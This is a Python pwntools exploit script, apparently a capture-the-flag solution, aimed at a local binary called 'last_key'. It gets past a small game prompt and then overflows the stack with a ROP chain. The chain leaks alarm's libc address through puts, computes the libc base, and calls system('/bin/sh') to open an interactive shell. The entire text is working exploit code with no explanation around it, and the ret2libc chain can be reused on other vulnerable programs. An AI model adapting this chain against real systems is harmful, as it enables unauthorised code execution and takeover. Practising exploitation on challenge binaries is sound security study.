#!/usr/bin/python
import sys
import struct
import subprocess
import os
import signal
from pwn import u64, p64, hexdump, ELF, process, gdb

deadcode = p64(0xdeadc0dedeadc0de)

puts_plt = p64(0x401100)
alarm_got = p64(0x403f98)

# 0x000000000040178d : pop rdi ; ret
pop_rdi_ret = p64(0x40178d)
ret = p64(0x40178e)

# 0x0000000000401687  set_score
# can go back to here if I want to send my payload again
set_score = p64(0x401687)
main_func = p64(0x401794)

# set_score_read = p64(0x401708)

# cheating with pwntools
e    = ELF("./last_key")
libc = ELF('./glibc/libc.so.6')

def main(launch_gdb=True):
    """
        Annoyingly I have to interact with the process
        to read stdout
    """
    # p = process(e.path)
    p = gdb.debug(e.path, gdbscript=open('script.gdb', 'r').read())

    # Play the "game"
    while True:
        line = p.recvline()
        print(f"Received line: {line}")
        if b"@" in line:
            pos_at = line.index(b"@")
            pos_star = line.index(b"*")

            num_spaces = line[pos_at+1:pos_star].count(b" ")
            break

    p.recvuntil(b': ')
    p.sendline(b'R'*(num_spaces+1))
    p.recvuntil(b'Fame: ')

    # Send first payload (libc leak)
    payload = b'A'*24
    payload += pop_rdi_ret
    payload += alarm_got
    payload += puts_plt
    payload += main_func

    p.sendline(payload)
    p.recvline()
    p.recvline()
    p.recvline()

    leaked_addr = p.recvline()
    print(hexdump(leaked_addr))
    alarm_libc = u64(leaked_addr[0:6].ljust(8,b'\x00'))
    print(hex(alarm_libc))

    libc_base = alarm_libc - libc.symbols.alarm
    print(hex(libc_base))

    # set libc base
    libc.address = libc_base
    system = p64(libc.symbols.system)
    execve = p64(libc.symbols.execve)
    libc_exit = p64(libc.symbols.exit)
    bin_sh = p64(next(libc.search(b'/bin/sh\x00')))

    # Play the "game" again
    while True:
        line = p.recvline()
        print(f"Received line: {line}")
        if b"@" in line:
            pos_at = line.index(b"@")
            pos_star = line.index(b"*")

            num_spaces = line[pos_at+1:pos_star].count(b" ")
            break

    p.recvuntil(b': ')
    p.sendline(b'R'*(num_spaces+1))
    p.recvuntil(b'Fame: ')

    # Send final payload
    print("Sending final payload")

    payload = b'B'*24
    payload += ret
    payload += pop_rdi_ret
    payload += bin_sh
    payload += system
    # jump to execve did not work, probably some extra stuff in the regs
    # that doesnt play nice with the args that its expecting
    # payload += execve
    payload += libc_exit

    print(hexdump(payload))
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "gdb":
        main(launch_gdb=True)
    else:
        main(launch_gdb=False)
